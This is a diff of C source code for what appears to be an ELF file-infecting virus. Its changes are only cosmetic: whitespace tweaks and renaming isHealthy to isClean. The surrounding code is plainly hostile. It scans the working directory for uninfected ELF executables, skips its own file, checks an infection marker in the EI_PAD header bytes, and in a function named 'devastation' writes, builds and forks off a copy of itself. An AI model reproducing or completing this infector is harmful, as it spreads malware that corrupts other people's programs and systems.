@@ -37,7 +37,6 @@ void devastation(char *fileName) {
 	char buf[200];
 	strcpy(buf,fileName);
 	strcat(buf,"_temp");
-
 	//write to a file.c in the same directory
 	char buf2[200];
 	strcpy(buf2,buf);
@@ -52,10 +51,8 @@ void devastation(char *fileName) {
 	strcat(command,buf);
 	system(command);
 	remove(buf2);
-
 	//fork ->
-	pid_t pid = fork();		
-
+	pid_t pid = fork();			
 	//1. Run the file
 	if(pid == 0) {
 		char *args[]={buf,NULL};
@@ -91,7 +88,7 @@ bool isELF(char* fileName) {
  * Returns true if the file has not been infected yet
  * by checking the padding entry in the EI_PAD of elf header
  */
-bool isHealthy(char* fileName) {
+bool isClean(char* fileName) {
 	int fd = open(fileName, O_RDONLY);
 	lseek(fd, EI_PAD, SEEK_SET);
 	uint32_t flag;
@@ -117,7 +114,7 @@ char* getHealthyHostFile(char *self_name) {
 	while((file = readdir(dir)) != NULL){
 		stat(file->d_name, &st);
 		if(!strcmp(file->d_name, self_name)) continue;	// Don't infect self
-		if(isELF(file->d_name) && isHealthy(file->d_name)){
+		if(isELF(file->d_name) && isClean(file->d_name)){
 			closedir(dir);
 			return file->d_name;
 		}
